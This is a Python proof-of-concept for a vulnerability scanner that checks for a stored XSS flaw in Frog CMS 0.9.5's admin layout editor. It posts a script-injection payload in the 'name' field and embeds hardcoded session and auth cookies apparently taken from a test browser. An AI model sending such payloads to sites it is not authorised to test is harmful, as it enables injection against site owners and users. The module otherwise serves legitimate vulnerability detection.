# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'FrogCMS_0001_L'  # 平台漏洞编号，留空
    name = 'Frog CMS跨站脚本漏洞'  # 漏洞名称
    level = VulnLevel.MED   # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2018-04-24'  # 漏洞公布时间
    desc = '''
        Frog CMS是软件开发者Philippe Archambault所研发的一套内容管理系统（CMS）。该系统提供页面模板、用户权限管理以及文件管理所需的工具。

        Frog CMS 0.9.5版本中存在跨站脚本漏洞。远程攻击者可借助admin/?/layout/edit页面上的‘name’参数利用该漏洞注入任意的Web脚本或HTML。  
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2018-08554'  # 漏洞来源
    cnvd_id = 'CNVD-2018-08554'  # cnvd漏洞编号
    cve_id = 'CVE-2018-10320'  # cve编号
    product = 'FrogCMS'  # 漏洞应用名称
    product_version = '0.9.5版'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '9bc58d25-e28b-48f3-9592-0db6b8ef0554'
    author = '47bwy'  # POC编写者
    create_date = '2018-07-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/FrogCMS-master/admin/?/layout/edit/1'
            # 首先注册用户。
            # 获取cookies
            cookies = {}
            raw_cookies = 'current_tab=:tab-1; expanded_rows=4; UM_distinctid=162db899f8a468-018514197574c8-17347a40-100200-162db899f8c3bc; CNZZDATA1707573=cnzz_eid%3D271628251-1524101653-http%253A%252F%252F127.0.0.1%252F%26ntime%3D1524101653; Hm_lvt_7b43330a4da4a6f4353e553988ee8a62=1524187137; rlF_lastvisit=1726%091524191267%09%2Ftest%2Fphpwind_v9.0.2_utf8%2Fphpwind_v9.0.2_utf8_20170401%2Findex.php%3Fm%3Ddesign%26c%3Dapi%26token%3Dt8QiA81ydN%26id%3D7%26format%3D; PHPSESSID=k4mlmjoo06qvrnks6hbsut3795; yzmphp_adminid=02fcWP1tbVyO3qjAa1o4Oj7ByNDb2DbcZpROpdWw; yzmphp_adminname=f744FywtmY54ZekJU2rO-dU8YZXZce7dHJjsdStEKAEwM5M; Hm_lpvt_7b43330a4da4a6f4353e553988ee8a62=1524187137; rlF_visitor=Dn3slOh4nWLgDBhDSMUhGlC3PsR%2FyarbBZim4JqNJp2SKE9mCXr3gw%3D%3D; csrf_token=5ac0a94ca5abfea6; frog_auth_user=exp%3D1525680458%26id%3D1%26digest%3D5a4183bf1c5de0fa91a7f31422e9a38e'
            for line in raw_cookies.split(';'):
                key, value = line.split('=', 1)  # 1代表只分一次，得到两个数据
                cookies[key] = value
            #print (cookies)
            data = 'layout%5Bname%5D=</textarea>"/><script>confirm(1234)</script><textarea>&commit=Save'
            url = self.target + payload
            r = requests.post(url, cookies=cookies, data=data)

            if "<script>confirm(1234)</script>" in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
